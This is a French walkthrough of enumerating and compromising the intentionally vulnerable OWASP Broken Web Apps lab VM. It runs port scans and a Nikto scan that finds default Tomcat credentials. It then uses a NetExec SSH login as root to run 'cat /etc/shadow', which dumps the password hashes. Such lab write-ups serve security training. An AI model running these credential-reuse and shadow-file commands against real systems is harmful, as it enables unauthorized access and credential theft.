# OWASP Broken Web Apps
1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.51
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.51...100%
[+] Scan Nmap 192.168.56.51...100%

[+] 22/tcp open
[+] 80/tcp open
[+] 8080/tcp open
 
==========================================================
|                       Rapports                         |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.51-tcp.html      |
==========================================================
```

&nbsp;

**👽 Nikto**

Essayons de trouver les identifiants du `Tomcat`

```
┌──[m0rph3u5@parrot]─[~/Desktop]
└──╼ $nikto -url http://192.168.56.51:8080 -C all
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.51
+ Target Hostname:    192.168.56.51
+ Target Port:        8080
+ Start Time:         2025-01-16 21:02:45 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ /examples/jsp/snp/snoop.jsp: Cookie JSESSIONID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104
+ /manager/html: Default account found for 'Tomcat Manager Application' at (ID 'root', PW 'owaspbwa'). Apache Tomcat. See: CWE-16
+ 26784 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-01-16 21:03:51 (GMT1) (66 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

&nbsp;

Cred tomcat tester sur `phpmyadmin`

<img width="1021" height="900" alt="Capture du 2025-01-16 21-17-50" src="https://github.com/user-attachments/assets/329502b3-25b4-4fe8-9e91-02f7d993cd38" />


&nbsp;

🖥️ **NetExec**

Test en `SSH` des cred trouver précédemment

```
┌─[m0rph3u5@parrot]─[~/Desktop]
└──╼ $nxc ssh 192.168.56.51 -u root -p owaspbwa -x 'cat /etc/shadow'
SSH         192.168.56.51   22     192.168.56.51    [*] SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4
SSH         192.168.56.51   22     192.168.56.51    [+] root:owaspbwa (Pwn3d!) Linux - Shell access!
SSH         192.168.56.51   22     192.168.56.51    [+] Executed command
SSH         192.168.56.51   22     192.168.56.51    root:$6$GUZ2FiFh$Gte3X3tiK1jEGB83oZnD7TyiogYS0lind43lpVJxN5dL/W0CsnHJfW9X7XBzMUUndXo8WCGYBPaYP79dwo..n.:14528:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    daemon:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    bin:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    sys:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    sync:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    games:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    man:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    lp:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    mail:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    news:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    uucp:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    proxy:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    www-data:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    backup:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    list:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    irc:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    gnats:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    nobody:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    libuuid:!:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    syslog:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    klog:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    mysql:!:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    landscape:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    sshd:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    postgres:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    messagebus:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    tomcat6:*:14471:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    user:$6$vGtj5JSH$mT18gcTVlO6HV.NYH0mx3/ItiiwKK.HyjV..RLxG6e.Gz9W894nBkn9wjQoaLUcL4W65pHicFVBUAOh8MMTJf1:14528:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    polkituser:*:14480:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    haldaemon:*:14480:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    pulse:*:14480:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51    postfix:*:14544:0:99999:7:::
SSH         192.168.56.51   22     192.168.56.51
```

&nbsp;

Identifiant trouver

| Users | Password |
| --- | --- |
| root | owaspbwa |
